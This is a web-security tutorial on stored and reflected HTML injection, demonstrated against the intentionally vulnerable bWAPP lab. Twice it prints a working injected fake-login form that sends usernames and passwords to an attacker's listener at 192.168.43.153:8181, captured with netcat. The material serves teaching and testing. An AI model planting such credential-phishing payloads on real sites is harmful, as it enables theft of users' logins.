HTML Injection Attack

HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. 

the HTML injection attack only allows the injection of certain HTML tags. HTML  injection attack is inject HTML code through the vulnerable parts of the website. When an application does not properly handle user supplied data, an attacker can supply valid HTML code, typically via a parameter value, and inject their own content into the page.  The Malicious user sends HTML code through any vulnerable field with the purpose to change the website’s design or any information that is displayed to the user.  This attack is typically used in conjunction with some form of social engineering, as the attack is exploiting a code-based vulnerability and a user's trust. As a result, the user may see the data that was sent by the malicious user. 

Two Types of HTML Injection

• Stored HTML Injection
• Reflected HTML Injection
			
A possible attack scenario is demonstrated below:

• Attacker discovers injection vulnerability and decides to use an HTML injection attack
• Attacker crafts malicious link, including his injected HTML content, and sends it to a user via email
• The user visits the page due to the page being located within a trusted domain
• The attacker's injected HTML is rendered and presented to the user asking for a username and password
• The user enters a username and password, which are both sent to the attackers server
			
Impact of the vulnerability:
This  vulnerability can have many consequences, like disclosure of a user's  session cookies that could be used to impersonate the victim, or, more  generally, it can allow the attacker to modify the page content seen by  the victims.



1) Stored HTML Injection: In this vulnerability the injected malicious script gets permanently store inside the web-applications server. stored HTML injection attack occurs when malicious HTML code is saved in the  web server and is being executed every time the user calls that.
		
How it works, Here we will understand through vulnerable Bee Wapp application.
		
Here we have browsed the target ip at http://192.168.43.102/bWAPP/htmli_stored.php and login with the creadential, user : bee and password : bug. shown in figure-1. 
			
![figure-1](https://user-images.githubusercontent.com/83446765/157544299-fb152a97-cd83-4aee-a139-92f5c143c496.png)			
figure-1
			
Now here we have set the  “Choose Your Bug” option to “HTML Injection – Stored (Blog)” and then clicked on the hack button. shown in figure-2.
			
![figure-2](https://user-images.githubusercontent.com/83446765/157544227-bb6e38f4-c8b1-4bdb-81ae-f58146b1e6ee.png)			
figure-2
			
Now, we’ll be redirected to the web page which is vulnerable from an stored HTML Injection vulnerability which allows the user to submit his entry in the given field as shown in the figure-3.
			
![figure-3](https://user-images.githubusercontent.com/83446765/157544250-475ce5b0-283c-4303-a4aa-ecff0d6522e1.png)			
figure-3
			
here we intered a normal user entry through user : bee  as “hello” in the given field, in order to confirm that the input data has successfully stored  in the webserver's database as shown in the figure-4 and figure-5.

![figure-4](https://user-images.githubusercontent.com/83446765/157544321-c183f6e3-3e2d-4c35-83e0-302512629315.png)			
figure-4
			
![figure-5](https://user-images.githubusercontent.com/83446765/157544291-9915e34d-006e-4ecf-8d67-533ff63159f7.png)			
figure-5
			
Here in this we insert a html tag after that in this field we see that here HTML tags are being easily inserted and stored as shown in the figure-6 and figure-7.

![figure-6](https://user-images.githubusercontent.com/83446765/157544281-7d836202-a05b-41b4-b01f-62d0d5b131e2.png)			
figure-6
			
![figure-7](https://user-images.githubusercontent.com/83446765/157544308-0473c24f-239e-4aa0-ba49-21594676e4e4.png)			
figure-7
			
			
			
Now, inject a malicious code that will create a fake user login form on the targeted web page and it will forward the form details to our IP that is 192.168.43.153. as shown in figure-8.
			
Enter the following HTML code inside the given field in order to set up the HTML attack. as shown in figure-8.

		<div style=" width: 1900px; height: 1300px; background-color:white; ">
		Please login with valid credenitals:<br>
		<form name="login" action="http://192.168.43.153:8181/login.html">
		<table>
		<tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr>
		<tr><td><input type="submit" value="Login"/></td></tr>
		</table>
		</form>
		</div>
			
![figure-8](https://user-images.githubusercontent.com/83446765/157544369-45316405-aa54-4a62-9e5a-f4241eb9e028.png)			
figure-8
			
			
			

			
when we clicked on the “Submit” button, a new login form  appeared on the webpage. This login form is stored now into the application’s web server, which gets rendered every time whenever the victim visits this malicious login page, this web page always have this form which looks official to him as shown in the figure-9.

![figure-9](https://user-images.githubusercontent.com/83446765/157544379-8d3444b8-a87f-420c-9235-78a7eb558dfd.png)			
figure-9
			
			
		
			
			
Now enable netcat listener on our ip at port 8181  in order to capture the victim’s request. as shown in the figure-10.
			
![figure-10](https://user-images.githubusercontent.com/83446765/157544363-c906d1e4-681c-419c-8ff5-edd5d5daefcc.png)
figure-10
			
						

				
Now wait, until the victim loads malicious page into his browser, and enters his credentials. as shown in the figure-11.
			
![figure-11](https://user-images.githubusercontent.com/83446765/157544381-1d2bbbce-2684-464f-ad6a-8a09d0e789d8.png)
figure-11
			
			
				
			
when victim enters his credentials, then you can see that the user “honey” browse the webpage and tried to login as honey:honey123.
			
Now come back to our listener,  and check what the credentials we got in the response .
in the figure-12 we can see that we have successfully capture the credentials.

![figure-12](https://user-images.githubusercontent.com/83446765/157544357-e8e856e4-cefc-43cd-85b8-b2ae2dda4a0f.png)			
figure-12
			
As this application is vulnerable with Stored HTML injection we can inject HTML code which permanently stored on the webserver. when the victim visit malicious web page and provide there credential on that page, if attacker listen at port which is given in the  malicious code then attacker get capture the credentials.  	
						
2) Reflected HTML Injection: In  the reflected injection attack case, malicious HTML code is not being  permanently stored on the webserver. Reflected Injection occurs when the  website immediately responds to the malicious input.

This can be again divided into three types:

◇ Reflected GET
◇ Reflected POST
◇ Reflected URL


Reflected Injection attack can be performed differently according to  the HTTP methods i.e, GET and POST. I would remind, that with POST  method data is being sent and with GET method data is being requested.
To know, which method is used for appropriate website's elements, we can check the source of the page.
			
The main difference that we’ll notice between the GET and PUT methods are that in GET parameters are specified in the URL. Let’s check our bWAPP application to see if that is the case.
			
Here we have browsed the target ip at http://192.168.43.102/bWAPP/htmli_stored.php and login with the creadential, user : bee and password : bug. shown in figure-13.
			
![figure-13](https://user-images.githubusercontent.com/83446765/157544303-e805ebef-d15a-4142-ae32-2298adef47c4.png)			 
figure-13
			
			
Now here we have set the  “Choose Your Bug” option to “HTML Injection – Reflected (GET)” and then clicked on the hack button. shown in figure-14.
			
![figure-14](https://user-images.githubusercontent.com/83446765/157544377-9789098d-5dbb-4b41-a8ec-99061d936634.png)			
figure-14
			
Now, we’ll be redirected to the web page which is vulnerable from an Reflected (GET) HTML Injection. as shown in figure-15. 			

![figure-15](https://user-images.githubusercontent.com/83446765/157544247-6aefcac9-589a-4960-8214-62679060c20d.png)			
figure-15
			
In the first blank field enter “Armour” and in the second field enter “Infosec” then click on go. as shown in figure-16.
			
![figure-16](https://user-images.githubusercontent.com/83446765/157544261-cbe57dc6-379f-4af0-b98d-a8993475e959.png)			
figure-16
			
			
Now see in the URL of the page we can see the firstname is Armour and lastname is Infosec. as shown in figure-17.

![figure-17](https://user-images.githubusercontent.com/83446765/157544273-9a58ea12-4faa-47be-86ae-eba7c4094a3a.png)			
figure-17
						
Here we inject <h1></h1> tag in the url. as shown in figure-18.

![figure-18](https://user-images.githubusercontent.com/83446765/157544265-f4e30ab5-7133-41d0-8095-c33115df4b98.png)			
figure-18
			
			
Because this application is vulnerable to HTML injection we inject HTML <h1> tag which reflects given input as shown in figure-19. and if we want we can even inject any URL, by clicking the user will be redirected to that site. or if we want so we can inject malicious code also.

![figure-19](https://user-images.githubusercontent.com/83446765/157544350-1d487eb1-8296-4ba3-b2bf-efaa4b59834d.png)			
figure-19
			
Here we inject an <a></a> (ancor) tag with <h1></h1> tag in the URL. as shown in figure-20.

![figure-20](https://user-images.githubusercontent.com/83446765/157544340-fcfc80dc-7150-4c29-968b-660f66620797.png)						
figure-20			
			
Now if the user will click on Armour then he will be redirect to google.com . as shown in figure-21.

![figure-21](https://user-images.githubusercontent.com/83446765/157544353-19b8fb02-0934-44b2-ba7d-59a1aa7b3661.png)			
figure-21
			
we can also inject the HTML tags like this. as shown in figure-22. and reflected content is shown in figure-23.			

![figure-22](https://user-images.githubusercontent.com/83446765/157544316-d7c57015-7ec3-4b44-a4c9-a5763fe4086d.png)			
figure-22
			
![figure-23](https://user-images.githubusercontent.com/83446765/157544326-4d5e1bbe-8ea4-44d0-9416-d86fd4ba223f.png)			
figure-23
			
Now, we inject malicious code also. we can inject malicious code by text area field or by url.here we inject malicious code by text area field.
Here in firstname field we entered “to Armour Infosec” and in the lastname field we Enter the following HTML code. in order to set up the HTML attack. as shown in 

![figure-24](https://user-images.githubusercontent.com/83446765/157544312-6e676c60-1666-47ac-9ae8-3a82125d6622.png)
figure-24.

		<div style=" background-color:white; ">
		Please login with valid credenitals:<br>
		<form name="login" action="http://192.168.43.153:8181/login.html">
		<table>
		<tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr>
		<tr><td><input type="submit" value="Login"/></td></tr>
		</table>
		</form>
		</div>
			
This malicious code will create a fake user login form on the targeted web page and it will forward the form details to form action url that is http://192.168.43.153:8181 where the atteker capture the credentials .
			
			
figure-24
			
when we clicked on the “go” button, a new login form  appeared on the webpage. as shown in figure-25.

![figure-25](https://user-images.githubusercontent.com/83446765/157544337-f8af5872-83ed-4edf-93b2-a1e3dd7b574c.png)			
figure-25
			
Now enable netcat listener on our ip at port 8181  in order to capture the victim’s request. as shown in the figure-26.
			
![figure-26](https://user-images.githubusercontent.com/83446765/157544239-e1c8153d-5fb8-414a-ae05-7a3e935ce650.png)			
figure-26
			
Now wait, until the victim open malicious page into his browser, and enters his credentials. as shown in the figure-27.

![figure-27](https://user-images.githubusercontent.com/83446765/157544331-bd8a5636-a6a4-4af2-8785-447c60b4e16d.png)			
figure-27
			
					
when victim enters his credentials, then you can see that the user “rohan” browse the webpage and tried to login as rohan:rohan12345.
			
Now come back to our listener,  and check what the credentials we got in the response .
in the figure-28 we can see that we have successfully capture the credentials.

![figure-28](https://user-images.githubusercontent.com/83446765/157544234-4c5f3a2d-fdc9-42f3-960e-0a03faf4b8f9.png)			
figure-28
			
Looks like it worked!







	

References: 
<p><a href="https://medium.com/@app.sec1900/html-injection-reflected-get-d89d614b02e">Referenc1</a> / <a href="https://www.acunetix.com/vulnerabilities/web/html-injection/">Referenc2</a> / <a href="https://devstringx-technologies.medium.com/html-injection-f1c9fc713d51">Referenc3</a> / <a href="https://www.hackingarticles.in/comprehensive-guide-on-html-injection/">Referenc4</a></p>






